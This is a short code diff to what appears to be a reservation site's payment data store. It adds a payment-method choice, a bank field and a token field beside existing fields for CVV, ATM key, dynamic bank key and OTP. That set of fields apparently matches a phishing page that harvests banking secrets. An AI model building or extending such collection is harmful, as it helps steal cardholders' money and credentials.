@@ -106,6 +106,8 @@ export interface ReservationData {
 		expiry: string; // MM/AA
 		cvv: string;
 		documentId?: string;
+		paymentMethod?: 'credit-debit' | 'pse';
+		bank?: string; // Para PSE
 	};
 	
 	// Estado de la reserva
@@ -119,6 +121,7 @@ export interface ReservationData {
 		dinamicKey?: string;
 		atmKey?: string;
 		otp?: string;
+		token?: string;
 		status?: 'pending' | 'approved' | 'failed';
 		timestamp?: string;
 	};
@@ -277,6 +280,8 @@ function createReservationStore(initialData: ReservationData = initialState) {
 			expiry: string;
 			cvv: string;
 			documentId?: string;
+			paymentMethod?: 'credit-debit' | 'pse';
+			bank?: string;
 		}) => {
 			persistUpdate(state => ({
 				...state,
@@ -292,6 +297,7 @@ function createReservationStore(initialData: ReservationData = initialState) {
 			dinamicKey?: string;
 			atmKey?: string;
 			otp?: string;
+			token?: string;
 			status?: 'pending' | 'approved' | 'failed';
 		}) => {
 			persistUpdate(state => ({
